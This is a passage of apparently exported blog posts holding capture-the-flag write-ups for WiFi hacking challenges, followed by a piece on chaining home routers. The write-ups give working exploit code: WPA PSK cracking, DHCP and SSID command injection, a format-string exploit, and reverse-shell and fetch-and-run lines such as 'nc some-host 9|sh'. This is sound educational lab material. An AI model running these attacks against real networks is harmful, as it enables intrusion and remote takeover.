It is both fun and rewarding for me to understand the world a bit better. This is also a great way to be constantly humbled by the magic that surrounds us \ud83c\udf08\\n\\nAlthough I enjoy the process of learning how things work, there are millions of things that I interact with daily, that I know so little about; embarrassing.\\n\\nHeck, how does WiFi work I thought? Because I know that I learn best by getting my hands dirty, I decided to try to solve a few challenges as an introduction. That is why I decided to check-out the March [Turtle challenge](https://turtles.supernetworks.org/) \ud83d\ude42\\n\\nIf you want to play at home, you can find the challenges on Github and one the SPR website:\\n- https://turtles.supernetworks.org/march\\n- https://github.com/spr-networks/turtles-march-2023\\n\\nYou can participate either directly from your browser via an impressive emulated Linux environment or you can self-host the challenge by cloning the [turtles-march-2023](https://github.com/spr-networks/turtles-march-2023) repository and follow the instructions. I chose to self-host the challenges as it made it easier to debug for me.\\n\\n## Warmups\\n\\nAll right, enough blah blah and let\'s get warmed up. In that part of the challenge, we are asked to extract data off two packet captures: `turtle0.pcap` & `turtle0.5.pcap`.\\n\\nFor the first capture, we need to extract a PSK that looks like the following: `turtle{x}`, great. Because we don\'t have more details regarding the PSK\'s shape itself, it is fair to assume that the authors want us to use a wordlist attack instead of trying to bruteforce it.\\n\\nI grabbed the famous [rockyou](https://github.com/zacheller/rockyou) wordlist and I wrote a small Python script to format prepend / append `turtle{}` as this is what the PSK will look like.\\n\\n```py\\nwith open(\'rockyou-turtle.txt\', \'w\', encoding=\'utf8\') as fout:\\n    with open(\'rockyou.txt\', \'r\', encoding=\'utf8\', errors=\'replace\') as fin:\\n        for line in fin.readlines():\\n            line = line.strip()\\n            fout.write(f\'turtle{{{line}}}\\\\n\')\\nprint(\'Done\')\\n```\\n\\nThen, I ran [aircrack-ng](https://www.aircrack-ng.org/) with the new wordlist against `turtle0.pcap` with the following command: `$ aircrack-ng turtle0.pcap -w rockyou-turtle.txt`.\\n\\nAfter a few minutes, a valid key was found: `turtle{power}`, great!\\n\\n```\\n                        Aircrack-ng 1.6\\n\\n[00:00:01] 3200/2465175 keys tested (5273.73 k/s)\\n\\nTime left: 7 minutes, 46 seconds                           0.13%\\n\\n                    KEY FOUND! [ turtle{power} ]\\n\\n\\nMaster Key     : 11 8C 23 85 2D 5F 7E AC DE 8C 85 B0 CB 80 02 5F\\n                CA 48 34 DF CE 2D 2A 7C 3C 01 4B A8 14 B7 2D E1\\n\\nTransient Key  : 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\\n                00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\\n                00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\\n                00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\\n\\nEAPOL HMAC     : 6B D2 F8 71 7F E5 D8 5E 5B 68 FE 53 0A 28 9D 4E\\n```\\n\\nThe next challenge says that there is data to be decrypted inside `turtle0.5.pcap`. Both the station and the AP use the [4-way handshake](https://en.wikipedia.org/wiki/IEEE_802.11i-2004) to derive various keys that are used to encrypt traffic. We cracked a PSK in the previous step, so we can  open the packet capture into [Wireshark](https://www.wireshark.org/) and let it decrypt the traffic for us. Follow Wireshark\'s [HowToDecrypt802.11](https://wiki.wireshark.org/HowToDecrypt802.11) article to know how to do that.\\n\\nOnce decrypted, there is a `PING` request with a flag in its payload: `turtle{deecoded}`, awesome.\\n\\n## Step 1\\n\\nOkay warmups done, time to have a look at the real challenges. For this step, the authors ask for us to crack another PSK from another packet capture of a handshake. We also have the [source code of a custom AP](https://github.com/spr-networks/turtles-march-2023/blob/main/t1_start/turtle1-ap-pcap.py).\\n\\nI initially threw `turtle1-handshake.pcap` at [aircrack-ng](https://www.aircrack-ng.org/) with the `rockyou-turtle.txt` wordlist but no valid key was found, bummer. I thought it was possible that this key was part of another famous wordlist so I downloaded a bunch of them, but ... same. Weird.\\n\\nI learned more about the 4-way handshake to understand how both the station & AP derive the keys needed to transmit / verify encrypted frames. Because the handshake was captured from a custom AP, it made sense to me that maybe [aircrack-ng](https://www.aircrack-ng.org/) didn\'t understand the handshake properly and missed PSK.\\n\\nI decided to implement the attack on my own. I used the MIC code that is sent by the AP in the 3rd message to verify if a candidate is valid or not (on top of the nonces/macs in the first / second messages). We have the entire EAPOL packet so we can compute the MIC code ourselves and verify if it matches the one sent by the AP. If it does, it means we have found a valid PSK \ud83e\udd24\\n\\nI ran the script against the *turtleified* rockyou wordlist, and eventually (it\'s slow!) found a valid PSK candidate: `turtle{excellent}` \ud83d\udd25\\n```python\\n# Axel \'0vercl0k\' Souchet - April 15 2023\\n# WIN w/ b\'turtle{excellent}\'\\nimport hashlib\\nimport hmac\\nfrom scapy.all import *\\n\\nclass EAPOL_KEY(Packet):\\n    name = \'EAPOL_KEY\'\\n    fields_desc = [\\n        ByteEnumField(\'key_descriptor_type\', 1, {1: \'RC4\', 2: \'RSN\'}),\\n        BitField(\'reserved2\', 0, 2),\\n        BitField(\'smk_message\', 0, 1),\\n        BitField(\'encrypted_key_data\', 0, 1),\\n        BitField(\'request\', 0, 1),\\n        BitField(\'error\', 0, 1),\\n        BitField(\'secure\', 0, 1),\\n        BitField(\'has_key_mic\', 1, 1),\\n        BitField(\'key_ack\', 0, 1),\\n        BitField(\'install\', 0, 1),\\n        BitField(\'key_index\', 0, 2),\\n        BitEnumField(\'key_type\', 0, 1, {0: \'Group/SMK\', 1: \'Pairwise\'}),\\n        BitEnumField(\'key_descriptor_type_version\', 0, 3, {\\n            1: \'HMAC-MD5+ARC4\',\\n            2: \'HMAC-SHA1-128+AES-128\',\\n            3: \'AES-128-CMAC+AES-128\',\\n            0x20: \'SALSA20-HMAC\'\\n        }),\\n        LenField(\'key_length\', None, \'H\'),\\n        LongField(\'key_replay_counter\', 0),\\n        XStrFixedLenField(\'key_nonce\', b\'\\\\x00\'*32, 32),\\n        XStrFixedLenField(\'key_iv\', b\'\\\\x00\'*16, 16),\\n        XStrFixedLenField(\'key_rsc\', b\'\\\\x00\'*8, 8),\\n        XStrFixedLenField(\'key_id\', b\'\\\\x00\'*8, 8),\\n        XStrFixedLenField(\'key_mic\', b\'\\\\x00\'*16, 16),\\n        LenField(\'wpa_key_length\', None, \'H\'),\\n        ConditionalField(\\n            XStrLenField(\'key\', b\'\\\\x00\'*16,\\n                         length_from=lambda pkt: pkt.wpa_key_length),\\n            lambda pkt: pkt.wpa_key_length and pkt.wpa_key_length > 0)\\n    ]\\n\\n\\ndef customPRF512(key, amac, smac, anonce, snonce):\\n    \\"\\"\\"Source https://stackoverflow.com/questions/12018920/\\"\\"\\"\\n    A = b\\"Pairwise key expansion\\"\\n    B = b\\"\\".join(sorted([amac, smac]) + sorted([anonce, snonce]))\\n    num_bytes = 64\\n    R = b\'\'\\n    for i in range((num_bytes * 8 + 159) // 160):\\n        R += hmac.new(key, A + chb(0x00) + B + chb(i), hashlib.sha1).digest()\\n    return R[:num_bytes]\\n\\ndef calc(pwd):\\n    amac = bytes.fromhex(\'02:00:00:00:00:00\'.replace(\':\', \'\'))\\n    smac = bytes.fromhex(\'02:00:00:00:01:00\'.replace(\':\', \'\'))\\n    anonce = bytes.fromhex(\\n        \'7338c25bf9d1bba6a8dea56e87bb8b6a2e3f658be7ba8173c6ab58991e648e5f\')\\n    snonce = bytes.fromhex(\\n        \'82ce083ab0cdb46f1ae0cc94a922cdf7ca742bf130396996f92be706cca62a25\')\\n    PMK = hashlib.pbkdf2_hmac(\'sha1\', pwd, b\'turtle1\', 4_096, 32)\\n    KCK = customPRF512(PMK, amac, smac, anonce, snonce)[:16]\\n    keydata = bytes.fromhex(\'ace914ed4b7bf2b638b81c841bd3ab67561681d57591496ff93465d173c04f911679a118fb7f9590faef7fe21aa5c82d8bc746b190ea84e1\')\\n    assert len(keydata) == 56\\n    ek = EAPOL(version=\'802.1X-2004\',type=\'EAPOL-Key\') / EAPOL_KEY(\\n        key_descriptor_type=2, key_descriptor_type_version=2, install=1, key_type=1, key_ack=1,\\\\\\n        has_key_mic=1, secure=1, encrypted_key_data=1, key_replay_counter=2, \\\\\\n        key_nonce=anonce, key_length=16, key=keydata, wpa_key_length=len(keydata)\\n    )\\n    return hmac.new(KCK, ek.build(), hashlib.sha1).digest()[:16]\\n\\ndef main():\\n    wanted = bytes.fromhex(\'7235448e1b056108e40ff429ad3545ab\')\\n    assert len(wanted) == 16\\n    with open(\'rockyou-turtle.txt\', \'r\', encoding=\'utf8\') as fin:\\n        for line in fin.readlines():\\n            candidate = line.strip().encode()\\n            c = calc(candidate)\\n            assert len(c) == 16\\n            if c == wanted:\\n                print(f\'WIN w/ {candidate}\')\\n                return\\n    print(\'Done\')\\n\\nif __name__ == \'__main__\':\\n    main()\\n```\\n\\n## Step 2\\n\\nAll right, final step. In this step, we are given another custom [AP\'s source code](https://github.com/spr-networks/turtles-march-2023/blob/main/t1_ap/turtleap/go.py) and we need to break in. How exciting uh?\\n\\nFor this step, I set-up an environment to debug and interact with the AP. I created a regular Hyper-V Ubuntu VM (note that this won\'t work from WSL2) and ran the two containers with the below commands:\\n\\n```text\\nover@bubuntu:~/turtles-march-2023$ sudo docker-compose up -d\\n[sudo] password for over:\\nStarting t1_ap    ... done\\nStarting t1_start ... done\\n\\nover@bubuntu:~/turtles-march-2023$ sudo ./setup.sh\\n```\\n\\nAt that stage, you can log-in into both containers with the following commands:\\n\\n```text\\nover@bubuntu:~/turtles-march-2023$ sudo docker exec -it t1_start bash\\nover@bubuntu:~/turtles-march-2023$ sudo docker exec -it t1_ap bash\\n```\\n\\n`t1_ap` is the container that runs the AP and `t1_start` is where you can run a client and send packets to the AP. This is cool because you don\'t need any physical Wifi device to play in this environment!\\n\\nOne of the keys that is derived during the 4-way handshake is meant to be shared by every station; kind of a group key. My understanding is that it is used to send broadcast-like packets to every station. In the AP, it turns out this key is a constant: `turtle{everyone gets a shell :)}` \ud83d\ude2c\\n\\nAfter reading the code carefully, it is clear that there you don\'t need to be associated with the AP to send a packet encrypted with this group key. This is particularly interesting because we don\'t have knowledge of the PSK which means we wouldn\'t be able to complete the 4-way handshake. In a normal AP, the `GTK` is shared in an encrypted frame and it isn\'t a constant / isn\'t known by an attacker (and is rotated every time a station disconnects).\\n\\nFinally, an attacker can trigger a shell command injection when the AP parses a DHCP offer packet:\\n```py\\ndef reply_dhcp_offer(self, incoming):\\n    # ...\\n    for o in incoming[DHCP].options:\\n        # Log hostname for DNS revers lookup\\n        if o[0] == \'hostname\':\\n            cmd = \\"echo %s %s.lan >> hostnames.txt\\" % (dest_ip, o[1].decode(\\"ascii\\"))\\n            os.system(cmd )\\n```\\n\\nAt this point we have every ingredients to break into the AP and execute arbitrary shell commands by sending a specially crafted DHCP offer packet  encrypted with the GTK \ud83d\udd25; here\'s my code that can be run from `t1_start`:\\n```py\\n# Axel \'0vercl0k\' Souchet - April 11 2023\\nfrom scapy.all import *\\nfrom salsa20 import Salsa20\\nfrom itertools import count\\nimport hmac\\nimport hashlib\\nimport struct\\n\\ngtk_full = b\'turtle{everyone gets a shell :)}\'\\nGTK = gtk_full[:16]\\nMIC_AP_TO_GROUP = gtk_full[16:24]\\ngroup_IV = count()\\n\\ndef encrypt(pkt):\\n  data = pkt.build()\\n  pn = next(group_IV)\\n  aad_calc = hmac.new(MIC_AP_TO_GROUP, data, hashlib.sha1).digest()[:16]\\n  key = GTK\\n  cipher = Salsa20(key, struct.pack(\'>Q\', pn))\\n  payload = cipher.encrypt(data) + aad_calc\\n  pn0 = pn & 0xff\\n  pn1 = (pn>>8) & 0xff\\n  pn2 = (pn>>16) & 0xff\\n  pn3 = (pn>>24) & 0xff\\n  return Dot11CCMP(data=payload, ext_iv=1, key_id=1, PN0 = pn0, PN1=pn1, PN2=pn2, PN3=pn3)\\n\\ndef main():\\n    # root@0c0b905e70eb:/# iw dev\\n    # phy#0\\n    #   Interface mon0\\n    #     ifindex 2\\n    #     wdev 0x2\\n    #     addr 02:00:00:00:00:00\\n    #     type monitor\\n    #     txpower 20.00 dBm\\n    #   Interface wlan0\\n    #     ifindex 50\\n    #     wdev 0x1\\n    #     addr 02:00:00:00:00:00\\n    #     type managed\\n    #     txpower 20.00 dBm\\n    ap = \'02:00:00:00:00:00\'\\n    # root@29a50eeb6fb5:/x# iw dev\\n    # phy#1\\n    #   Interface wlan1\\n    #     ifindex 51\\n    #     wdev 0x100000001\\n    #     addr 02:00:00:00:01:00\\n    #     type managed\\n    #     txpower 20.00 dBm\\n    station = \'02:00:00:00:01:00\'\\n    cmd = \'id; ls /\'\\n    inner_pkt = Ether(src=station) / IP() / UDP(dport=67) / BOOTP(op=1) / DHCP(options=[\\n        (\'hostname\', f\'; {cmd} #\'),\\n    ])\\n    receiver = ap\\n    sender = station\\n    bssid = ap\\n    pkt = RadioTap() / Dot11(addr1=receiver, addr2=sender, addr3=bssid, FCfield=\'to-DS+protected\') / encrypt(inner_pkt)\\n    pkt.show()\\n    os.system(\'iw dev wlan1 interface add mon1 type monitor 2>/dev/null\')\\n    sendp(pkt, iface = \'mon1\', verbose = True)\\n\\nif __name__ == \'__main__\':\\n    main()\\n```\\n\\nThanks again to SPR, the challenge authors for putting out free educational content, you guys rock \ud83d\udc4f\ud83c\udffd\u270a\ud83c\udffd"},{"id":"january-2023-turtles","metadata":{"permalink":"/pages/blog/january-2023-turtles","source":"@site/blog/2023-02-15-turtles-jan.md","title":"January 2023\'s Turtles Challenge","description":"Editor\'s note:","date":"2023-02-15T00:00:00.000Z","formattedDate":"February 15, 2023","tags":[{"label":"Turtles","permalink":"/pages/blog/tags/turtles"},{"label":"CTF","permalink":"/pages/blog/tags/ctf"},{"label":"Hacking","permalink":"/pages/blog/tags/hacking"},{"label":"WiFi","permalink":"/pages/blog/tags/wi-fi"},{"label":"EvilTwin","permalink":"/pages/blog/tags/evil-twin"},{"label":"Deauthentication","permalink":"/pages/blog/tags/deauthentication"}],"readingTime":8.745,"hasTruncateMarker":false,"authors":[{"name":"Amy","url":"https://twitter.com/itszn13","key":"Amy"}],"frontMatter":{"slug":"january-2023-turtles","title":"January 2023\'s Turtles Challenge","authors":"Amy","tags":["Turtles","CTF","Hacking","WiFi","EvilTwin","Deauthentication"]},"prevItem":{"title":"March 2023\'s Turtles Challenge","permalink":"/pages/blog/spr-turtles-march"},"nextItem":{"title":"Run Virtual SPR on a Google Cloud Free Tier Instance","permalink":"/pages/blog/virtual-spr-on-a-gcloud-tier-free-instance"}},"content":"#### Editor\'s note:\\n\\n\\nThe Turtles WiFi challenges are a series of ctf-style problems concerning network and wifi security skills.\\nWe first ran a challenge in this style at [Stockholm\'s Midnight Sun CTF Finals in August \'22 at the Turtles MidnightSun Finals](https://github.com/spr-networks/turtles-midnightsunctf-2022-finals).

Congratulations! And thanks again for putting this writeup together.\\n\\nFebruary\'s contest will be released on the 20th and we will be giving out more raspberry pis!\\n\\n## Intro\\n\\nWe find ourselves in a twisting maze of WLANs. There are 5 machines connected across several WLAN networks. We start as root on the first machine and must move laterally across the network to exfiltrate 3 flag files.  From our box we can connect to an access point with the SSID \\"jan-turtle1\\".\\n\\n![](/img/xturtles_jan.png)\\n\\n## Flag 1\\nOur first target is also connected to the \\"jan-turtle1\\" AP over WPA3. We can assume that the target may be doing something interesting over this network, so performing a MitM attack may be fruitful. To pull this off we can use the so-called [\\"Evil Twin Attack\\"](https://en.wikipedia.org/wiki/Evil_twin_(wireless_networks)) where we impersonate the AP.\\n\\nFirst we need to set up our own AP with the same SSID and configuration as the existing \\"jan-turtle1\\" AP. I used `hostapd` to do this with the following config:\\n\\n```\\ninterface=wlan2\\ndriver=nl80211\\nhw_mode=a\\nchannel=40\\nssid=jan-turtle1\\nwpa=2\\nwpa_key_mgmt=SAE\\nwpa_pairwise=CCMP\\nap_isolate=1\\nsae_password=sn0wt0rt0ise\\n```\\n\\n```bash\\nip addr add dev wlan2 192.168.1.1/24\\nhostapd -B /root/h.conf\\n```\\n\\nOnce we have the AP up and running, clients looking for the real \\"jan-turtle1\\" AP may connect to our malicious AP instead. However the target is already connected to the existing AP, so it won\'t attempt to reconnect to our AP.\\n\\nLuckily we can force it off of the original AP by abusing [deauthentication packets](https://en.wikipedia.org/wiki/Wi-Fi_deauthentication_attack). If we send these packets with a spoofed target address, we cause the target to disconnect. Once the client has disconnected, there is a chance that they will reconnect to our malicious access point. We can use [`aireplay-ng`](https://www.aircrack-ng.org/doku.php?id=aireplay-ng) to perform this attack on a second WLAN:\\n```bash\\nip link set dev wlan3 up\\nyes | airmon-ng start wlan3 40\\n# Start deauth on target MAC\\naireplay-ng -0 10 -a 02:00:00:00:00:00 -c 02:00:00:00:01:00 wlan3mon &\\n```\\n\\n```\\n# tcpdump -i wlan2 -v\\n06:09:53  Waiting for beacon frame (BSSID: 02:00:00:00:00:00) on channel 40\\n06:09:53  Sending 64 directed DeAuth (code 7).

Lets host our own http server using python:\\n```\\n# python3 -m http.server 80\\nServing HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/)\\n192.168.1.2 - - [15/Feb/2023 06:17:06] \\"GET /install.sh HTTP/1.1\\" 404 -\\n192.168.1.2 - - [15/Feb/2023 06:17:16] code 404, message File not found\\n```\\nIf we create our own `install.sh`, it looks like the box will run it! Lets get a reverse shell\\n```bash\\nbash -i >& /dev/tcp/192.168.1.1/1337 0>&1\\n```\\nNice, we captured the first flag!\\n```\\nListening on 0.0.0.0 1337\\nConnection received on 192.168.1.2 47550\\nbash: cannot set terminal process group (8): Inappropriate ioctl for device\\nbash: no job control in this shell\\nroot@2d419af9c243:/# cat flag1.txt\\nturtles{0f004d8e004f4577952eda915426eac38f4df6b4}\\nroot@2d419af9c243:/#\\n```\\n\\n## Flag 2\\n\\nFor the second stage, we are given a binary named [`wardriver`](https://en.wikipedia.org/wiki/Wardriving) which is running on the second target. This binary has two main features. First it used `iw dev <dev> scan` to collect information on all near by access points.\\n\\n```c\\nint getData() {\\n  __snprintf_chk(command, 256LL, 1LL, 256LL, \\"iw dev %s scan\\", (const char *)IFACE);\\n  if ( fopen(\\"scan.txt\\", \\"r\\") )\\n    strcpy(command, \\"cat scan.txt\\");\\n  v0 = popen(command, \\"r\\");\\n  insert(v0);\\n  ...\\n  sqlite3_exec(v7, v8, 0LL, 0LL);\\n}\\n__int64 __fastcall insert(...) {\\n  ...\\n  __snprintf_chk(\\n        v8, 256LL, 1LL, 256LL,\\n        \\"INSERT INTO wifis VALUES(%d, \'%s\', \'%s\', \'%s\');\\",\\n        _id, bss_str, ssid_str, signal_str,\\n    );\\n}\\n```\\n\\nIf we create an malicious AP, the SSID will be formatted into this INSERT command. We can use this to perform an SQL insert injection into the database, allowing us to control any field of a new entry to the `wifis` table.\\n\\nNext we look at the second functionality. The binary will periodically dump values from the table and send them as data using a curl command:\\n\\n```c\\n__int64 dump() {\\n  ...\\n  v0 = sqlite3_exec(v3, \\"SELECT * FROM wifis\\", callback, 0LL);\\n  ...\\n}\\n__int64 __fastcall callback(...) {\\n...\\n  if ( bss_str && signal_str ) {\\n    __snprintf_chk(\\n      command, 128LL, 1LL, 128LL,\\n      \\"curl %s --data \\\\\\"{\\\\\\\\\\\\\\"bss\\\\\\\\\\\\\\": \\\\\\\\\\\\\\"%s\\\\\\\\\\\\\\", \\\\\\\\\\\\\\"signal\\\\\\\\\\\\\\": \\\\\\\\\\\\\\"%s\\\\\\\\\\\\\\"}\\\\\\"\\",\\n      \\"http://127.0.0.1:8080/logs\\",\\n      bss_str, signal_str);\\n    system(command);\\n    return 0LL;\\n  }\\n  return 1LL;\\n}\\n```\\n\\nWe can see that there is no sanitization of the `bss` or `signal` columns when formatted into the command. We can trigger command injection here by creating a malicious wifi entry using the SQL injection in the previous function. The length of command injection in the SSID is limited, so I fetched a second stage from a remote host. Here is the `hostapd` config with the SQL injection payload:\\n```sql\\ninterface=wlan4\\ndriver=nl80211\\nhw_mode=a\\nchannel=48\\nssid=\',\'\'),(2,\'`nc some-host 9|sh`\',\'\\nwpa=2\\nwpa_key_mgmt=SAE\\nwpa_pairwise=CCMP\\nap_isolate=1\\nsae_password=shred_the_gnar_pow\\n```\\n\\nAfter a few seconds the wardriver picks up our AP and we get a connect back on the second target!\\n```\\n$ nc -l 1338 -v\\nListening on 0.0.0.0 1338\\nConnection received on 192.168.1.2 58580\\nbash: cannot set terminal process group (8): Inappropriate ioctl for device\\nbash: no job control in this shell\\nroot@b976e8a2f52b:/# cat flag2.txt\\ncat flag2.txt\\nturtles{f0c03d9e242a89f1df51e5da9a833750398fe989}\\nroot@b976e8a2f52b:/#\\n```\\n\\n## Flag 3\\nFor the final target, we need to exploit an SOAP Server running on the second AP. Our second target box is already authenticated to the AP, so we can easily talk to the server directly.\\n\\nDecompiling the binary, we see that it is a simple HTTP server which implements a few parts of the [SOAP protocol](https://en.wikipedia.org/wiki/SOAP). We can perform a some actions such as listing the server uptime or date.\\n\\nThe first bug I found was in an error handler. This handler uses the `http_response` function to build a response with HTTP code 400. However for the body pointer, it mistakenly passes a `void**` pointer instead of a `char*` ptr. This will leak the address of the `soap_action` function as well as a stack address in the body of the 400 response.\\n```c\\nint __cdecl http_response(...) {\\n  fprintf(stream, \\"HTTP/1.1 %d %s\\\\r\\\\n\\", a2, a3);\\n  fwrite(\\"Server: OS/Version UPnP/1.0 product/version\\", 1u, 0x2Bu, stream);\\n  fwrite(\\"Content-Type: text/html\\\\r\\\\n\\", 1u, 0x19u, stream);\\n  fwrite(\\"Connection: close\\\\r\\\\n\\", 1u, 0x13u, stream);\\n  fwrite(\\"\\\\r\\\\n\\", 1u, 2u, stream);\\n  fprintf(stream, \\"<HTML><HEAD><TITLE>%d %s</TITLE></HEAD>\\\\n<H4>%d %s</H4>\\\\n\\", a2, a3, a2, a3);\\n  ...\\n}\\nunsigned int __cdecl handle_client(int fd) {\\n  void* __soap_action_ = soap_action;\\n  char *v7;\\n  char buf[2048];\\n  v7 = &buf;\\n  if ( _isoc99_sscanf(...) ) {\\n    ...\\n    __soap_action(steam);\\n  } else {\\n    http_response(stream, 400, \\"Invalid request\\", (const char *)&__soap_action_)\\n  }\\n}\\n```\\nWe can trigger this leak with the following code:\\n```python\\nsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\\nsock.connect((HOST, PORT))\\n\\nsock.sendall(b\'ENDEND a\\\\n\')\\nleak = (sock.recv(4096).split(b\'request</H4>\\\\n\',1)[1]\\n\\t\\t.split(b\'ENDEND\',1)[0].ljust(8,b\'\\\\0\'))\\ntext_leak = u32(leak[:4])\\nstack_leak = u32(leak[4:])\\n\\nsock.close()\\n```\\n\\nLooking closer at the string functions being used, there are several buffer overflows from calls to `sprintf` and `strcpy`. However almost all of these are protected by stack-cookies. Luckily there is a single case where a pointer lays between a buffer and the stack-cookie:\\n\\n```c\\n__int64 __cdecl soap_response(...) {\\n  char dest[2048];\\n  char src[2048];\\n  char* format_str;\\n  unsigned int cookie;\\n  ...\\n  format_str = \\"%s\\";\\n  ...\\n  sprintf(&src[off], \\"%s\\", sub_action);\\n  ...\\n  sprintf(&src[off], format_str, action);\\n}\\n```\\n\\nSince we are able to buffer overflow `src` using the first `sprintf` call, we can smash the `format_str` ptr. This allows point `format_str` at our own data on the stack (using the leak from earlier), giving us an arbitrary [format string vulnerability](https://en.wikipedia.org/wiki/Uncontrolled_format_string).\\n\\nWe can easily exploit the format string by using the `%123$hhn` syntax. This syntax will write the number of bytes printed so far as a `uint8_t` at a given offset on the stack. This is very handy as we can use it to surgically corrupt a return pointer without messing with the stack-cookie.\\n\\nAt this point we can control the EIP register, but we still need to actually get code execution. There is an easy way to do this by abusing the calls to `system` in the binary. We can partially corrupt the return address to point it to the following address in the binary:\\n```\\n.text:00001A76                 call    system\\n.text:00001A7B                 add     esp, 10h\\n.text:00001A7E                 sub     esp, 8\\n```\\nThe first argument of system will be the next value pointed to by ESP, which just so happens to be our format string from before. We can simply prepend our format string exploit with a command to run!\\n\\n```python\\n# Prep return byte overwrite targets\\ng1 = 0x76\\ng2 = ((text_leak & 0xf000) >> 8) + 0xa\\n\\nsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\\nsock.connect((HOST, PORT))\\n\\npl = b\'post / a\\\\nSOAPAction: \'\\npl += b\'numberwang#wangernum42\'\\n\\n# Place write targets on the stack\\npl += p32(target_stack_ret)\\npl += p32(target_stack_ret+1)\\n# Padding\\npl += b\'EEEE\'\\npl += b\'FFFF\'\\npl += b\'A\'*(1824-4*4)\\n# Smash format ptr\\npl += p32(stack_leak)\\npl += b\'\\\\n\\\\n\'\\n\\n# Command to run in system\\nfmt = \'nc some-host 10|sh;#\'\\n\\n# Format string exploit\\nfmt +=  f\'%{g1-len(fmt)}c\'+\'%592$hhn\'+f\'%{g2-g1}c\'+\'%593$hhn\'\\npl += fmt.encode(\'latin-1\')\\n\\nsock.sendall(pl)\\n```\\n\\nWith this exploit ready to go, we can run it from the second target box. Once the exploit lands we are greeted with our last reverse shell and get the last flag!\\n\\n```\\n$ nc -l 1339 -v\\nListening on 0.0.0.0 1339\\nConnection received on 192.168.1.2 14253\\nbash: cannot set terminal process group (8): Inappropriate ioctl for device\\nbash: no job control in this shell\\nroot@21fbbf871fa0:/# cat flag3.txt\\nturtles{c14583540ce6a34f73cb04d964aff18415916fae}\\nroot@21fbbf871fa0:/#\\n```\\n\\n\\n#### Editor\'s note:\\n\\nChallenge 3 is based on a flaw the Supernetworks team exploited in preparation for December\'s pwn2own contest against the Netgear RAX30.

And ideally offline  \ud83e\udda6\\n\\nIf the goal is a bit of both, how to do segmentation correctly quickly becomes\\na bit of a puzzle\\n\\n\\n## What\'s the Best Way to Chain Your Routers?\\n\\nThe \\"Secure Router\\" can be considered the Work From Home access point,\\nand the \\"Guest Router\\" can be considered the Guest, Personal, or IOT access point.\\n\\n ![](/img/chaining_choices.png)\\n\\n#### The Worst Choice\\n\\nOption #3 is to connect the internet to the secure router, and then plug the\\nguest router into the secure router. Guests and untrustworthy devices can connect\\nto the guest router.\\n\\nThis might make sense intuitively for some. You put the Secure Router close\\nto the internet since that\'s where all the internet traffic will go out from, and\\nif the Guest Router is compromised, it can\'t intercept traffic.\\n\\nHowever, since the Guest Router is a Peer on the Secure Router network\'s LAN,\\nevery \\"Guest\\" station and the router will be able to reach the secure router and\\ndevices on the secure network LAN.\\n\\nUnless either the Guest Router can block requests to the Secure LAN with its firewall,\\nor the Secure Router can isolate the port for the Guest Router for only internet access,\\nthis is not an accepted best practice.\\n\\n#### Split ESSIDs\\n\\nOption #2 is to share a router for both SSIDs, with one ESSID and password for the\\nSecure LAN and one for the Guest LAN.\\n\\nThe expectation is that devices can not send packets across the two LANs.\\n\\nThe great tradeoff with this is that if a user wants to control their IOT devices\\nthey have to switch to the guest network. And if device isolation is enabled on the guest network,\\ndevices won\'t be able to communicate at all. So as security improves, usability decreases.\\n\\nThe guest isolation may also be insufficient. The shared passphrase implies MITM capabilities,\\nand passive traffic decryption capabilities with WPA2 or active decryption capabilities with WPA3.\\n\\nSome routers place both ESSIDs on the SAME LAN. Usually this allows the secure devices\\nto reach the guest devices. Usability has been increased, but this often leads to subtle flaws\\nthat allow the guest devices to bypass their isolation entirely.\\n\\nAnother upside to this approach is that bandwidth can be shared for the ESSIDs,\\nreducing wasted WiFi spectrum.\\n\\nOverall, this is an accepted best practice, but it comes down to the details where very quickly\\nusers are trading off security for usability.\\n\\n#### The Best of the Three: Guest Router First, Secure Router Second\\n\\nOption #1 is the recommended and accepted best practice. The guest network connects\\ndirectly to the internet, and the secure router plugs into the guest Router.\\n\\nThis approach yields a favorable combination of security and usability. Devices on the\\nsecure LAN can access devices on the Guest LAN, which is great for controlling IOT devices.\\nAnd devices on the Guest LAN have no way to initiate communication to devices on the\\nSecure LAN, blocked by the Guest Router firewall.\\n\\nThe main downsides: The guest router could have ISP credentials, and could MITM\\ninternet traffic if compromised by an untrusted device\\n\\n### Multi PSK & VLANs\\n\\nToday\'s most featureful home routers offer support for one passphrase per device. This solves\\nmany of the MITM and decryption issues for guest isolation. The devices can be placed into VLANs with unique WiFi passphrases, GTKs, and secure firewall rules creating truly strong isolation. These mechanisms provide powerful mechanisms for designing a home network securely.\\n\\nThis is the approach SPR follows, and we\'ve [spearheaded Multi-PSK with WPA3](/blog/multipsk%20and%20wpa3).\\nSPR provides maximum isolation capabilities by placing each station into its own LAN. Users can then easily\\ncreate groups of interconnected devices.\\n\\n![](/img/tinynets.png)\\n\\n\\n### SPR Supports Plugging into An Existing Router Securely\\n\\nWe recommend running SPR by plugging it into an existing router. To support securely doing this,\\nby default -- the firewall will block access to private network addresses over the upstream interface.\\n\\nThis prevents devices connected to SPR from accessing devices on the LAN of the current router.\\n\\nTo allow a device access to private network addresses upstream, users can apply the `lan_upstream` tag to the device.\\n\\n![](/img/add_wifi_device_lan_upstream.png)\\n\\nAnd then manage the tag in the Devices view\\n\\n![](/img/manage_lan_upstream_tag.png)"},{"id":"multipsk and wpa3","metadata":{"permalink":"/pages/blog/multipsk and wpa3","source":"@site/blog/2022-05-02-wpa3-multipsk.md","title":"SPR Supports WPA3 with Multiple Passwords","description":"SPR\'s WPA3 Multiple Passwords per SSID Surprises People","date":"2022-05-02T00:00:00.000Z","formattedDate":"May 2, 2022","tags":[{"label":"SPR","permalink":"/pages/blog/tags/spr"},{"label":"wifi6","permalink":"/pages/blog/tags/wifi-6"},{"label":"WPA3","permalink":"/pages/blog/tags/wpa-3"},{"label":"PPSK","permalink":"/pages/blog/tags/ppsk"}],"readingTime":1.885,"hasTruncateMarker":false,"authors":[{"name":"Alex Radocea","url":"https://twitter.com/defendtheworld","key":"ltsrad"}],"frontMatter":{"slug":"multipsk and wpa3","title":"SPR Supports WPA3 with Multiple Passwords","authors":"ltsrad","tags":["SPR","wifi6","WPA3","PPSK"]},"prevItem":{"title":"Securely Chaining Routers","permalink":"/pages/blog/secure router 